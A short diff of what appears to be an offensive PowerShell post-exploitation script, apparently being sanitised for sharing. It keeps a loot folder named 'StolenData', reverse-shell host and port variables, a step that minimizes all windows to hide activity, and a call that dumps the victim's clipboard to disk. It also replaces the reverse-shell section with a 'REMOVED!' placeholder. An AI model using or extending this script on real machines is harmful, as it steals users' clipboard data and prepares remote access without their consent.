@@ -8,8 +8,8 @@
 #####################################
 
 $LootDir = "c:\StolenData"
-$revHost = "172.16.1.123"
-$revPort = "12345"
+$revHost = "172.16.1.123" # Not Included in this script
+$revPort = "12345"        # Not Included in this script
 
 # Mimimize all windows First!
 (New-Object -ComObject Shell.Application).MinimizeAll()
@@ -113,7 +113,9 @@ function Write-ClipboardToDisk {
 # Example usage:
 Write-ClipboardToDisk -OutputFilePath "C:\StolenData\clipboard.txt"
 
-
+## Reverseshell section
+## REMOVED!
+## End Reverseshell Section
 
 # This is a one time shot server, so we will kill it!
 # Kill the server (change /s to /l if only logoff needed)
